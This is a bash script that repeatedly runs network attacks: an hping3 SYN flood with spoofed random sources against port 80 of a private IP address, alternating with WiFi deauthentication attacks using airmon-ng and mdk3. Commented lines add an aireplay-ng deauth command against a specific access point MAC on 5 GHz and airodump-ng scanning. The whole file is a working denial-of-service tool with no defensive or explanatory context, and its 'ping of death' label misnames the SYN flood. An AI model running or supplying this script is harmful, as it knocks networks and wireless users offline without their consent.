#!/bin/bash
INPUT_STRING=hello
while [ "$INPUT_STRING" != "exit" ]
do
    sleep 7
    echo ping of death
    hping3 -c 100000000000 -d 300 -i u1 --rand-source -S --flood -p 80 172.31.168.83 >/dev/null 2>&1 &
    pid=$!
    sleep 100
    kill -INT $pid
    echo enabling monitor mode
    airmon-ng start wlp0s20f3 >/dev/null 2>&1 &
    sleep 7
    echo deauth attack
    mdk3 wlp0s20f3mon d -c 5 >/dev/null 2>&1 &
    # iw wlp0s20f3mon set freq 5765 80 5775 && aireplay-ng --deauth 0 -a 20:58:69:05:C5:CC wlp0s20f3mon     #only working solution for 5ghz til now
    # airodump-ng wlp0s20f3mon -C 5765 or airodump-ng wlp0s20f3mon -c 153       #list of available APs on a channel
    # iw wlp0s20f3mon set txpower fixed 3000    #not working
    pid=$!
    sleep 25
    kill -INT $pid
    echo disabling monitor mode
    airmon-ng stop wlp0s20f3mon >/dev/null 2>&1 &
done